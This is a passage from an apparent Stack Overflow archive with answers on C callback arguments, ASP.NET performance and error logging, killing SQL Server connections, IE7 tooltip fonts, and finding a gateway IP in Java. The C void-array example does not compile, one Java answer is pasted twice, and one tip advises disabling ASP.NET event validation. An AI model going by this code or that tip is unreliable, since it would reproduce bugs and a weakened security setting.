<li>Have the last argument in your prototype be a void*. This gives you flexibility of passing in anything else that you need, but it definitely isn't type-safe.</li>
<li>Use variadic parameters (...). Given my lack of experience with variadic parameters in C, I'm not sure if you can use this with a function pointer, but this gives even more flexibility than the first solution, albeit still with the lack of type safety.</li>
<li>Upgrade to C++ and use <a href=""http://en.wikipedia.org/wiki/Function_object"">function objects</a>.</li>
</ol>
 <p>If I'm reading this right, what I'd suggest is to make your function take a pointer to a struct as an argument. Then, your struct can have can have ""game"" and ""depth"" when it needs them, and just leave them set to 0 or Null when you don't need them. </p>

<p>What is going on in that function? Do you have a conditional that says, </p>

<pre><code>if (depth &gt; -1) //some default
  {
  //do something
  }
</code></pre>

<p>Does the function always REQUIRE ""game"" and ""depth"". Then, they should always be arguments, and that can go into your prototypes. </p>

<p>Are you indicating the function only sometimes requires ""game"" and ""depth""? Well, maybe make two functions and use each one when you need to. </p>

<p>But, having a structure as the argument is probably the easiest thing.</p>
 <p>If you're willing to use some C++, you can use a ""function object"":</p>

<pre><code>struct MoveHandler {
    chess_game *game;
    int depth;

    MoveHandler(chess_game *g, int d): game(g), depth(d) {}

    void operator () (chess_move*) {
         // now you can use the game and the depth
    }
};
</code></pre>

<p>and turn your <code>foreachMove</code> into a template:</p>

<pre><code>template &lt;typename T&gt;
void foreachMove(T action, chess_game* game);
</code></pre>

<p>and you can call it like this:</p>

<pre><code>chess_move getNextMove(chess_game* game, int depth){
    //for each valid move, determine how good the move is
    foreachMove(MoveHandler(game, depth), game);
}
</code></pre>

<p>but it won't disrupt your other uses of <code>MoveHandler</code>.</p>
 <p>I'd suggest using an array of void*, with the last entry always void.
say you need 3 parameters you could do this:</p>

<pre><code>void MoveHandler (void** DataArray)
{
    // data1 is always chess_move
    chess_move data1 = DataArray[0]? (*(chess_move*)DataArray[0]) : NULL; 
    // data2 is always float
    float data1 = DataArray[1]? (*(float*)DataArray[1]) : NULL; 
    // data3 is always char
    char data1 = DataArray[2]? (*(char*)DataArray[2]) : NULL; 
    //etc
}

void foreachMove( void (*action)(void**), chess_game* game);
</code></pre>

<p>and then</p>

<pre><code>chess_move getNextMove(chess_game* game, int depth){
    //for each valid move, determine how good the move is
    void* data[4];
    data[0] = &amp;chess_move;
    float f1;
    char c1;
    data[1] = &amp;f1;
    data[2] = &amp;c1;
    data[3] = NULL;
    foreachMove(moveHandler, game);
}
</code></pre>

<p>If all the parameters are the same type then you can avoid the void* array and just send a NULL-terminated array of whatever type you need.</p>
 <p>+1 to Antonio.  You need to change your function pointer declaration to accept additional parameters.</p>

<p>Also, please don't start passing around void pointers or (especially) arrays of void pointers.  That's just asking for trouble.  If you start passing void pointers, you're going to also have to pass some kind of message to indicate what the pointer type is (or types are).  This technique is <em>rarely</em> appropriate.</p>

<p>If your parameters are always the same, just add them to your function pointer arguments (or possibly pack them into a struct and use that as the argument if there are a lot of parameters).  If your parameters change, then consider using multiple function pointers for the multiple call scenarios instead of passing void pointers.</p>
 <p>If your parameters change, I would change the function pointer declaration to use the ""..."" technique to set up a variable number of arguments.  It could save you in readability and also having to make a change for each parameter you want to pass to the function.  It is definately a lot safer than passing void around.</p>

<p><a href=""http://publications.gbdirect.co.uk/c_book/chapter9/stdarg.html"" rel=""nofollow"" title=""excanvas""><a href=""http://publications.gbdirect.co.uk/c_book/chapter9/stdarg.html"" rel=""nofollow"">http://publications.gbdirect.co.uk/c_book/chapter9/stdarg.html</a></a></p>

<p>Just an FYI, about the example code in the link: some places they have “n args” and others it is “n_args” with the underscore. They should all have the underscore. I thought the syntax looked a little funny until  I realized they had dropped the underscore in some places.</p>
 <p>Use a typedef for the function pointer. See my <a href=""http://stackoverflow.com/questions/9410/how-do-you-pass-a-function-as-a-parameter-in-c#9421"">answer</a> for <a href=""http://stackoverflow.com/questions/9410/how-do-you-pass-a-function-as-a-parameter-in-c"">this question</a></p>
 <p>Another option would be to modify the <code>chess_move</code> structure instead of the function prototype. The structure is presumably defined in only one place already. Add the members to the structure, and fill the structure with appropriate data before any call which uses it.</p>
"
"Speeding up an ASP.Net Web Site or Application <p>I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. </p>

<p>What I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?</p>

<p>What other ways are there to optimize a .Net web site?</p>

<p>UPDATE: 
I've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many? </p>
 <p>You could turn on compression based on your client supporting it. See this article: <a href=""http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/d52ff289-94d3-4085-bc4e-24eb4f312e0e.mspx?mfr=true"" rel=""nofollow"" title=""excanvas"">link text</a></p>
 <p>Static resources shouldn't be resent unless changed. IIS will send a response code which tells the browser to use the cached version.</p>
 <ol>
<li><a href=""http://weblogs.asp.net/scottgu/archive/2008/05/12/visual-studio-2008-and-net-framework-3-5-service-pack-1-beta.aspx"">Script Combining in .net 3.5 SP1</a></li>
<li><a href=""http://developer.yahoo.com/performance/rules.html"">Best Practices for fast websites</a></li>
<li>HTTP Compression (gzip)</li>
<li>Compress JS / CSS (different than http compression, minify javascript)
<ol>
<li><a href=""http://developer.yahoo.com/yui/compressor/"">YUI Compressor</a></li>
<li><a href=""http://www.codeplex.com/YUICompressor"">.NET YUI Compressor</a></li>
</ol></li>
</ol>

<p>My best advice is to check out the <a href=""http://developer.yahoo.com/YUI"">YUI content</a>. They have some great articles that talk about things like <a href=""http://www.alistapart.com/articles/sprites/"">CSS sprites</a> and have some <a href=""http://developer.yahoo.com/yui/imageloader/"">nice javascript libraries to help reduce the number of requests</a> the browser is making.</p>
 <p>Turn viewstate off by default, it will be a night and day difference on even the most simple pages.</p>
 <p>I think you really need to be able to get some actual PerfMon data/telemetry from the app whilst running in production to be able to make an enlightened decision about what to optimise. </p>

<p>As a throw away tip I'd make sure your app is deployed as a <em>Release</em> build and set debug=""false"" in the '<em>compilation</em>' section of your web.config.</p>
 <p>If you are using Firefox to test your website, you might want to try a nifty Firefox extension from Yahoo! called <a href=""https://addons.mozilla.org/en-US/firefox/addon/5369"" rel=""nofollow"">YSlow</a>. </p>

<p>It analyzes your web pages and provides grades from A-F (A being the Best and F being the worst) for each of the best practices, for high performance websites. It will help you to track down the elements of your website which you could optimize to gain speedups.</p>
 <p>You seem to be starting by assuming that your problem is download size - that may not necessarily be the case. You should do some experimentation with your ASP.NET site to determine if there are areas in your code which are causing undue delays. If it turns out that download size is not your problem, you'll need to find ways to cache your results (look into output caching, which is an ASP.NET feature) or optimize your code.</p>

<p>In any case - the first step when looking at a performance issue is <em>always</em> to verify your assumptions first, then decide on a course of action.</p>
 <p>Have you tried these tips?</p>

<p><a href=""http://weblogs.asp.net/haroonwaheed/archive/2008/06/30/ASP.NET-Performance-Tips.aspx"" rel=""nofollow"" title=""excanvas""><a href=""http://weblogs.asp.net/haroonwaheed/archive/2008/06/30/ASP.NET-Performance-Tips.aspx"" rel=""nofollow"">http://weblogs.asp.net/haroonwaheed/archive/2008/06/30/ASP.NET-Performance-Tips.aspx</a></a></p>
 <p>I wrote a <a href=""http://terrapinstation.wordpress.com/2008/06/12/aspnet-http-comression-and-reducing-response-size/"" rel=""nofollow"" title=""excanvas"">blog post</a> about improving ASP.NET page performance this a couple months back. Here are some quick &amp; easy ways -</p>

<ul>
<li>Turn off view state</li>
<li>Turn off event validation</li>
<li>Implement HTTP gzip/deflate compression to reduce the response size (number of bytes the server has to send back to the client)</li>
<li>Try to optimize/minimize your database calls for each request</li>
</ul>
 <p>You could start looking at caching strategies. Static files like CSS (even compressed ones) and images (even optimized ones) should only need to be downloaded once by the browser for a period of time. </p>

<p>Scirpt combining for AJAX has already been mentioned, but I didn't notice reference to the ScriptReferenceProfiler MS has released on codeplex to help figure out what to combine. Mike Ormond <a href=""http://blogs.msdn.com/mikeormond/archive/2008/06/26/asp-net-ajax-scriptreferenceprofiler.aspx"" rel=""nofollow"">has a good start point on this</a>.</p>

<p>Another tip if you're doing a lot of INSERTs to your database is to double check your server's disk caching is switched on. Case in point, I had an data importer doing 1.2 million inserts during a run. Took 4 hours and change without caching on. Took 16 minutes with it on. </p>
 <p>You could also look at ASP.NET output caching, which can be applied fairly granularly to different portions of your page:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/xsbfdd8c(VS.71).aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/xsbfdd8c(VS.71).aspx</a></p>
 <p>A general thing when using ASP.NET and Ajax (any Ajax library) together is to avoid elephanting your Page_Load and Page_Init (and their method counterparts) things since these will be executing on every Ajax Request.</p>

<p>When that is said I would seriously ditch ASP.NET AJAX and use <em>anything</em> else...</p>

<p>Anthem.NET, AjaxPRO.NET, jQuery or whatever else than ASP.NET AJAX...</p>

<p>Of course I would use <a href=""http://ra-ajax.org"" rel=""nofollow"">Ra-Ajax</a> myself since that's my project. But then again I am biased...</p>
"
"How do you kill all current connections to a SQL Server 2005 database? <p>I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.</p>

<p>How can I kill all the connections to the database so that I can rename it?</p>
 <p>In MS SQL Server Management Studio on the object explorer, right click on the database. In the context menu that follows select 'Tasks -> Take Offline'</p>
 <p>See <a href=""http://wiki.lessthandot.com/index.php/Kill_All_Active_Connections_To_A_Database"">Kill All Active Connections To A Database</a>.</p>

<p>The reason that the approach that <a href=""http://stackoverflow.com/questions/11620/how-do-you-kill-all-current-connections-to-a-sql-server-2005-database/11627#11627"">Adam suggested</a> won't work is that during the time that you are looping over the active connections new one can be established, and you'll miss those. The article I linked to uses the following approach which does not have this drawback:</p>

<pre><code>-- set your current connection to use master otherwise you might get an error

use master
ALTER DATABASE YourDatabase SET SINGLE_USER WITH ROLLBACK IMMEDIATE 

--do you stuff here 

ALTER DATABASE YourDatabase SET MULTI_USER
</code></pre>
 <p>Script to accomplish this, replace 'DB_NAME' with the database to kill all connections to:</p>

<pre><code>USE master
GO

SET NOCOUNT ON
DECLARE @DBName varchar(50)
DECLARE @spidstr varchar(8000)
DECLARE @ConnKilled smallint
SET @ConnKilled=0
SET @spidstr = ''

Set @DBName = 'DB_NAME'
IF db_id(@DBName) &lt; 4
BEGIN
PRINT 'Connections to system databases cannot be killed'
RETURN
END
SELECT @spidstr=coalesce(@spidstr,',' )+'kill '+convert(varchar, spid)+ '; '
FROM master..sysprocesses WHERE dbid=db_id(@DBName)

IF LEN(@spidstr) &gt; 0
BEGIN
EXEC(@spidstr)
SELECT @ConnKilled = COUNT(1)
FROM master..sysprocesses WHERE dbid=db_id(@DBName)
END
</code></pre>
 <p>Using SQL Management Studio Express:</p>

<p>In the Object Explorer tree drill down under Management to ""Activity Monitor"" (if you cannot find it there then right click on the database server and select ""Activity Monitor""). Opening the Activity Monitor, you can view all process info. You should be able to find the locks for the database you're interested in and kill those locks, which will also kill the connection.</p>

<p>You should be able to rename after that. </p>
 <p>Try this:</p>

<pre><code>ALTER DATABASE [DATABASE_NAME]
SET SINGLE_USER
WITH ROLLBACK IMMEDIATE
</code></pre>
 <p>I've always used:</p>

<pre><code>
ALTER DATABASE DB_NAME SET SINGLE_USER WITH ROLLBACK IMMEDIATE 
GO 
SP_RENAMEDB 'DB_NAME','DB_NAME_NEW'
Go 
ALTER DATABASE DB_NAME_NEW  SET MULTI_USER -- set back to multi user 
GO 
</code></pre>
 <p>I usually run into that error when I am trying to restore a database I usually just go to the top of the tree in Management Studio and right click and restart the database server (because it's on a development machine, this might not be ideal in production).  This is close all database connections.</p>
 <p>Kill it, and kill it with fire:</p>

<pre><code>USE master
go

DECLARE @dbname sysname
SET @dbname = 'yourdbname'

DECLARE @spid int
SELECT @spid = min(spid) from master.dbo.sysprocesses where dbid = db_id(@dbname)
WHILE @spid IS NOT NULL
BEGIN
EXECUTE ('KILL ' + @spid)
SELECT @spid = min(spid) from master.dbo.sysprocesses where dbid = db_id(@dbname) AND spid &gt; @spid
END
</code></pre>
 <p>Here's how to reliably this sort of thing in MS SQL Server Management Studio 2008 (may work for other versions too):</p>

<ol>
<li>In the Object Explorer Tree, right click the root database server (with the green arrow), then click activity monitor.</li>
<li>Open the processes tab in the activity monitor, select the 'databases' drop down menu, and filter by the database you want.</li>
<li>Right click the DB in Object Explorer and start a 'Tasks -> Take Offline' task. Leave this running in the background while you...</li>
<li>Safely shut down whatever you can.</li>
<li>Kill all remaining processes from the process tab.</li>
<li>Bring the DB back online.</li>
<li>Rename the DB.</li>
<li>Bring your service back online and point it to the new DB.</li>
</ol>
 <p>Right click on the database name, click on Property to get property window, Open the Options tab and change the ""Restrict Access"" property from Multi User to Single User. When you hit on OK button, it will prompt you to closes all open connection, select ""Yes"" and you are set to rename the database....</p>
 <p>Take offline takes a while and sometimes I experience some problems with that..</p>

<p>Most solid way in my opinion:</p>

<p><strong>Detach</strong>
Right click DB -> Tasks -> Detach...
check ""Drop Connections"" 
Ok</p>

<p><strong>Reattach</strong>
Right click Databases -> Attach..
Add... -> select your database, and change the Attach As column to your desired database name.
Ok</p>
 <p>Another ""kill it with fire"" approach is to just restart the MSSQLSERVER service.
I like to do stuff from the commandline. Pasting this exactly into CMD will do it:
NET STOP MSSQLSERVER &amp; NET START MSSQLSERVER</p>

<p>Or open ""services.msc"" and find ""SQL Server (MSSQLSERVER)"" and right-click, select ""restart"".</p>

<p>This will ""for sure, for sure"" kill ALL connections to ALL databases running on that instance.</p>

<p>(I like this better than many approaches that change and change back the configuration on the server/database)</p>
 <p>The option working for me in this scenario is as follows: </p>

<ol>
<li>Start the ""Detach"" operation on the database in question. This wil open a window (in SQL 2005) displaying the active connections that prevents actions on the DB. </li>
<li>Kill the active connections, cancel the detach-operation. </li>
<li>The database should now be available for restoring.</li>
</ol>
 <pre><code>Select 'Kill '+ CAST(p.spid AS VARCHAR)KillCommand into #temp
from master.dbo.sysprocesses p (nolock)
join master..sysdatabases d (nolock) on p.dbid = d.dbid
Where d.[name] = 'your db name'

Declare @query nvarchar(max)
--Select * from #temp
Select @query =STUFF((                              
            select '  ' + KillCommand from #temp
            FOR XML PATH('')),1,1,'') 
Execute sp_executesql @query 
Drop table #temp
</code></pre>

<p>use the 'master' database and run this query, it will kill all the active connections from your database.</p>
 <p>These didn't work for me (SQL2008 Enterprise), I also couldn't see any running processes or users connected to the DB.  Restarting the server (Right click on Sql Server in Management Studio and pick Restart) allowed me to restore the DB.</p>
 <p>I'm using SQL Server 2008 R2, my DB was already set for single user and there was a connection that restricted any action on the database. Thus the recommended <a href=""http://stackoverflow.com/a/11624/1451048"">SQLMenace's</a> solution responded with error. <a href=""http://blog.tech-cats.com/2008/01/kill-all-database-connections-to-sql.html"" rel=""nofollow"">Here is one that worked in my case</a>.</p>
 <pre><code>ALTER DATABASE [Test]
SET OFFLINE WITH ROLLBACK IMMEDIATE

ALTER DATABASE [Test]
SET ONLINE
</code></pre>
 <p>You can Use SP_Who command and kill all process that use your database and then rename your database.</p>
 <p>I use sp_who to get list of all process in database. This is better because you may want to review which process to kill.</p>

<pre><code>declare @proc table(
    SPID bigint,
    Status nvarchar(255),
    Login nvarchar(255),
    HostName nvarchar(255),
    BlkBy nvarchar(255),
    DBName nvarchar(255),
    Command nvarchar(MAX),
    CPUTime bigint,
    DiskIO bigint,
    LastBatch nvarchar(255),
    ProgramName nvarchar(255),
    SPID2 bigint,
    REQUESTID bigint
)

insert into @proc
exec sp_who2

select  *, KillCommand = concat('kill ', SPID, ';')
from    @proc
</code></pre>

<p><strong>Result</strong><br>
You can use command in KillCommand column to kill the process you want to.</p>

<pre><code>SPID    KillCommand
26      kill 26;
27      kill 27;
28      kill 28;
</code></pre>
"
"How can I get Unicode characters to display properly for the tooltip for the IMG ALT in IE7? <p>I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.</p>
 <p>I'm not sure about the unicode issue but if you want the tooltip effect you should be using the title attribute, not alt.</p>

<p>Alt is for text you want screenreaders to speak, and it's what gets displayed if an image can't be loaded.</p>
 <p>This is because the font used in the tooltip doesn't include the characters you are trying to display. Try installing a font pack that includes those characters. I'm affraid you can't do much for your site's visitors other than implementating a tooltip yourself using javascript.</p>
 <p>Can you sanitize the alt text so that it doesn't have the characters in it, preferably by replacing the entire text with something useful (rather than just filtering the string)?  That's not ideal, but neither is displaying broken characters, or telling your users to install a new font pack.</p>
 <p>Where's your Japanese input coming from? It could be that it's in a non-unicode (e.g. <a href=""http://en.wikipedia.org/wiki/JIS_X_0208"" rel=""nofollow"">http://en.wikipedia.org/wiki/JIS_X_0208</a>) encoding, whereas your file is in unicode so the browser attempts to interpret the non-unicode characters as unicode and gets confused. I tried throwing together an example to reproduce your problem:</p>

<pre><code>&lt;img src=""test.png"" alt=""日本語"" /&gt;
</code></pre>

<p>The tooltip displays properly under IE7 with the Japanese language pack installed.</p>
 <p>Do note that the alt attribute isn't intended to be a tooltip. Alt is for describing the image where the image itself is not available. If you want to use tooltips, use the title attribute instead.</p>
 <p>In IE and Firefox on Win2000/WinXP/Vista, with the Japanese Language support installed from Regional Options, this just works. On Win95/98/ME, it only worked on a Japanese OS, at least with IE, because of limitations in the Windows tooltip control in non-NT systems. (Regarding other answers which guide you to the title attribute: the same behavior applied with the title attribute).</p>

<p>However, it's possible that font linking/font mapping won't kick in if you haven't installed the language support, or if you've just copied some font to your fonts folder. It's also possible that your default font choice for tooltips doesn't support Japanese, though GDI font-linking fallback should kick in on Win2000 or above, unless the font lies about what it supports.</p>

<p>The ""empty square"" phenomenon is typically suggestive of a font mapping problem, though it's remotely possible that the encoding is wrong.</p>

<p>Are your users Japanese-speakers? Does this problem occur on a system with a Japanese default system locale?</p>
"
"How can I determine the IP of my router/gateway in Java? <p>How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?</p>

<p>This is somewhat easy in .NET if you know your way around. But how do you do it in Java?</p>
 <p>That is not as easy as it sounds.  Java is platform independent, so I am not sure how to do it in Java.  I am <em>guessing</em> that .NET contacts some web site which reports it back.  There are a couple ways to go.  First, a deeper look into the ICMP protocol may give you the information you need.  You can also trace the IP you go through (your route).  When you encounter an IP that is not in the following ranges:</p>

<ul>
<li>10.0.0.0 – 10.255.255.255</li>
<li>172.16.0.0 – 172.31.255.255</li>
<li>192.168.0.0 – 192.168.255.255</li>
</ul>

<p>it is the IP one hop away from yours, and probably shares a few octets of information with your IP.</p>

<p>Best of luck.  I'll be curious to hear a definitive answer to this question.</p>
 <p>Try shelling out to traceroute if you have it.</p>

<p>'traceroute -m 1 www.amazon.com' will emit something like this:</p>

<pre><code>traceroute to www.amazon.com (72.21.203.1), 1 hops max, 40 byte packets
 1  10.0.1.1 (10.0.1.1)  0.694 ms  0.445 ms  0.398 ms
</code></pre>

<p>Parse the second line.  Yes, it's ugly, but it'll get you going until someone posts something nicer.</p>
 <p>You may be better off using something like checkmyip.org, which will determine your public IP address - not necessarily your first hop router: at Uni I have a ""real"" IP address, whereas at home it is my local router's public IP address.</p>

<p>You can parse the page that returns, or find another site that allows you to just get the IP address back as the only string.</p>

<p>(I'm meaning load this URL in Java/whatever, and then get the info you need).</p>

<p>This should be totally platform independent.</p>
 <p>Matthew: Yes, that is what I meant by ""I can get my internet IP using a service on a website."" Sorry about being glib.</p>

<p>Brian/Nick: Traceroute would be fine except for the fact that lots of these routers have ICMP disabled and thus it always stalls.</p>

<p>I think a combination of traceroute and uPnP will work out. That is what I was planning on doing, I as just hoping I was missing something obvious.</p>

<p>Thank you everyone for your comments, so it sounds like I'm not missing anything obvious. I have begun implementing some bits of uPnP in order to discover the gateway.</p>
 <p>Java doesn't make this as pleasant as other languages, unfortunately. Here's what I did:</p>

<pre><code>import java.io.*;
import java.util.*;

public class ExecTest {
    public static void main(String[] args) throws IOException {
        Process result = Runtime.getRuntime().exec(""traceroute -m 1 www.amazon.com"");

        BufferedReader output = new BufferedReader(new InputStreamReader(result.getInputStream()));
        String thisLine = output.readLine();
        StringTokenizer st = new StringTokenizer(thisLine);
        st.nextToken();
        String gateway = st.nextToken();
        System.out.printf(""The gateway is %s\n"", gateway);
    }
}
</code></pre>

<p>This presumes that the gateway is the second token and not the third. If it is, you need to add an extra <code>st.nextToken();</code> to advance the tokenizer one more spot.</p>
 <p>Regarding UPnP: be aware that not all routers support UPnP. And if they do it could be switched off (for security reasons). So your solution might not always work.</p>

<p>You should also have a look at NatPMP.</p>

<p>A simple library for UPnP can be found  at <a href=""http://miniupnp.free.fr/"" rel=""nofollow"">http://miniupnp.free.fr/</a>, though it's in C...</p>
 <p>To overcome the issues mentioned with traceroute (ICMP-based, wide area hit) you could consider:</p>

<ol>
<li>traceroute to your public IP (avoids wide-area hit, but still ICMP)</li>
<li>Use a non-ICMP utility like ifconfig/ipconfig (portability issues with this though).</li>
<li>What seems the best and most portable solution for now is to shell &amp; parse netstat (see the code example <a href=""http://forums.sun.com/thread.jspa?threadID=5289135"" rel=""nofollow"">here</a>) </li>
</ol>
 <p>On windows parsing the output of IPConfig will get you the default gateway, without waiting for a trace.</p>
 <p>On Windows, OSX, Linux, etc then Chris Bunch's answer can be much improved by using </p>

<pre><code>netstat -rn
</code></pre>

<p>in place of a <code>traceroute</code> command.</p>

<p>Your gateway's IP address will appear in the second field of the line that starts either <code>default</code> or <code>0.0.0.0</code>.</p>

<p>This gets around a number of problems with trying to use <code>traceroute</code>:</p>

<ol>
<li>on Windows <code>traceroute</code> is actually <code>tracert.exe</code>, so there's no need for O/S dependencies in the code</li>
<li>it's a quick command to run - it gets information from the O/S, not from the network</li>
<li><code>traceroute</code> is sometimes blocked by the network</li>
</ol>

<p>The only downside is that it will be necessary to keep reading lines from the <code>netstat</code> output until the right line is found, since there'll be more than one line of output.</p>

<p><strong>EDIT:</strong> The Default Gateway's IP Address is in the second field of the line that starts with 'default' if you are on a MAC (tested on Lion), or in the <strong>third field</strong> of the line that starts with '0.0.0.0' (tested on Windows 7)</p>

<p>Windows:</p>

<blockquote>
  <blockquote>
    <p>Network Destination        Netmask          Gateway       Interface  Metric</p>
    
    <p>0.0.0.0              0.0.0.0    <strong>192.168.2.254</strong>     192.168.2.46     10</p>
  </blockquote>
</blockquote>

<p>Mac:</p>

<blockquote>
  <blockquote>
    <p>Destination        Gateway            Flags        Refs      Use   Netif Expire</p>
    
    <p>default            <strong>192.168.2.254</strong>      UGSc          104        4     en1</p>
  </blockquote>
</blockquote>
 <pre><code>try{

    Process result = Runtime.getRuntime().exec(""netstat -rn"");

    BufferedReader output = new BufferedReader
	(new InputStreamReader(result.getInputStream()));

    String line = output.readLine();
    while(line != null){
	if ( line.startsWith(""default"") == true )
	    break;		
	line = output.readLine();
    }


    StringTokenizer st = new StringTokenizer( line );
    st.nextToken();
    gateway = st.nextToken();

    st.nextToken();
    st.nextToken();
    st.nextToken();

    adapter = st.nextToken();

}catch( Exception e ) { 
    System.out.println( e.toString() );
    gateway = new String();
    adapter = new String();
}
</code></pre>
 <p>You can query the URL ""http://whatismyip.com/automation/n09230945.asp"".
For example:</p>

<pre><code>	BufferedReader buffer = null;
	try {
		URL url = new URL(""http://whatismyip.com/automation/n09230945.asp"");
		InputStreamReader in = new InputStreamReader(url.openStream());
		buffer = new BufferedReader(in);

		String line = buffer.readLine();
		System.out.println(line);
	} catch (IOException e) {
		e.printStackTrace();
	} finally {
		try {
			if (buffer != null) {
				buffer.close();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
</code></pre>
 <p>output of netstat -rn is locale specific.
on my system (locale=de) the output looks like:
...
Standardgateway:         10.22.0.1</p>

<p>so there is no line starting with 'default'.</p>

<p>so using netstat might be no good idea.</p>
 <p>This Version connects to www.whatismyip.com, reads the content of the site and searches via regular expressions the ip adress and prints it to the cmd. Its a little improvement of MosheElishas Code</p>

<pre><code>import java.io.BufferedReader;  
import java.io.IOException;  
import java.io.InputStreamReader; 
import java.net.URL;  
import java.util.regex.Matcher;  
import java.util.regex.Pattern;  

public class Main {

    public static void main(String[] args) {
        BufferedReader buffer = null;
        try {
            URL url = new URL(
                    ""http://www.whatismyip.com/tools/ip-address-lookup.asp"");
            InputStreamReader in = new InputStreamReader(url.openStream());
            buffer = new BufferedReader(in);
            String line = buffer.readLine();
            Pattern pattern = Pattern
                    .compile(""(.*)value=\""(\\d+).(\\d+).(\\d+).(\\d+)\""(.*)"");
            Matcher matcher;
            while (line != null) {
                matcher = pattern.matcher(line);
                if (matcher.matches()) {
                    line = matcher.group(2) + ""."" + matcher.group(3) + "".""
                            + matcher.group(4) + ""."" + matcher.group(5);
                    System.out.println(line);
                }
                line = buffer.readLine();
            }
        } catch (IOException e) {
            e.printStackTrace();

        } finally {
            try {
                if (buffer != null) {
                    buffer.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}

import java.io.BufferedReader;  
import java.io.IOException;  
import java.io.InputStreamReader; 
import java.net.URL;  
import java.util.regex.Matcher;  
import java.util.regex.Pattern;  

public class Main {

    public static void main(String[] args) {
        BufferedReader buffer = null;
        try {
            URL url = new URL(
                    ""http://www.whatismyip.com/tools/ip-address-lookup.asp"");
            InputStreamReader in = new InputStreamReader(url.openStream());
            buffer = new BufferedReader(in);
            String line = buffer.readLine();
            Pattern pattern = Pattern
                    .compile(""(.*)value=\""(\\d+).(\\d+).(\\d+).(\\d+)\""(.*)"");
            Matcher matcher;
            while (line != null) {
                matcher = pattern.matcher(line);
                if (matcher.matches()) {
                    line = matcher.group(2) + ""."" + matcher.group(3) + "".""
                            + matcher.group(4) + ""."" + matcher.group(5);
                    System.out.println(line);
                }
                line = buffer.readLine();
            }
        } catch (IOException e) {
            e.printStackTrace();

        } finally {
            try {
                if (buffer != null) {
                    buffer.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
</code></pre>
 <p>In windows you can just use the following command:</p>

<pre><code>ipconfig | findstr /i ""Gateway""
</code></pre>

<p>Which will give you output like:</p>

<pre><code>Default Gateway . . . . . . . . . : 192.168.2.1
Default Gateway . . . . . . . . . : ::
</code></pre>

<p>However I can't run this command with Java, gonna post when I figure this out.</p>
 <p>You can use <code>netstat -rn</code> command which is available on Windows, OSX, Linux, etc platform. Here is my code:</p>

<pre><code>private String getDefaultAddress() {
        String defaultAddress = """";
        try {
            Process result = Runtime.getRuntime().exec(""netstat -rn"");

            BufferedReader output = new BufferedReader(new InputStreamReader(
                    result.getInputStream()));

            String line = output.readLine();
            while (line != null) {
                if (line.contains(""0.0.0.0"")) {

                    StringTokenizer stringTokenizer = new StringTokenizer(line);
                    stringTokenizer.nextElement(); // first element is 0.0.0.0
                    stringTokenizer.nextElement(); // second element is 0.0.0.0
                    defaultAddress = (String) stringTokenizer.nextElement();
                    break;
                }

                line = output.readLine();

            } // while
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return defaultAddress;

} // getDefaultAddress
</code></pre>
"
"How do you log errors (Exceptions) in your ASP.NET apps? <p>I'm looking for the best way to log errors in an ASP.NET application.
I want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.</p>

<p>In my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was ""Ok"" but not very flexible nor configurable.</p>

<p>We swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.</p>

<p>But I discovered lately that there's a whole Namespace in the .Net framework for this purpose : <a href=""http://msdn.microsoft.com/en-us/library/system.web.management.aspx"">System.Web.Management</a> and it can be configured in the <a href=""http://msdn.microsoft.com/en-us/library/2fwh2ss9(VS.80).aspx"">healthMonitoring</a> section of web.config.</p>

<p>Have you ever worked with .Net health monitoring? What is your solution for error logging?</p>

<p>Thanks,</p>

<p>Vincent</p>
 <p>We use a custom home grown logging util we wrote.  It requires you to implement logging on your own everywhere you need it.  But, it also allows your to capture alot more then just the exception.</p>

<p>For example our code would look like this:</p>

<pre><code>&lt;pre&gt;&lt;code&gt;
Try
  Dim p as New Person()
  p.Name = ""Joe""
  p.Age = 30
Catch ex as Exception
  Log.LogException(ex,""Err creating person and assigning name/age"")
  Throw ex
End Try
&lt;/code&gt;&lt;/pre&gt;
</code></pre>

<p>This way our logger will write all the info we need to a sql db.  We have email alerts set up at the db level to look for certain errors or frequently occurring errrors.  It helps us identify exactly where the errors are coming from.</p>

<p>This might not be exactly what you're looking for.  Another approach similar to using Global.asax is to us a code injection technique like <a href=""http://en.wikipedia.org/wiki/Aspect-oriented_programming"" rel=""nofollow"">AOP</a> with <a href=""http://www.postsharp.org/"" rel=""nofollow"">PostSharp</a>.  This allows you to inject custom code at the beginning and end of every method or on every exception.  It' an interesting approach but I believe it may have a heavy performance overhead.</p>
 <p>My team uses <a href=""http://logging.apache.org/log4net/index.html"" rel=""nofollow"" title=""excanvas"">log4net</a> from Apache.  It's pretty lightweight and easy to setup.  Best of all, it's completely configurable from the web.config file, so once you've got the hooks in your code setup, you can completely change the way logging is done just by changing the web.config file.  </p>

<p>log4net supports logging to a wide variety of locations - database, email, text file, Windows event log, etc.  My team has it configured to send detailed error information to a database, and also send an email to the entire team with enough information for us to determine in which part of the code the error originated.  Then we know who is responsible for that piece of code, and they can go to the database to get more detailed information.</p>
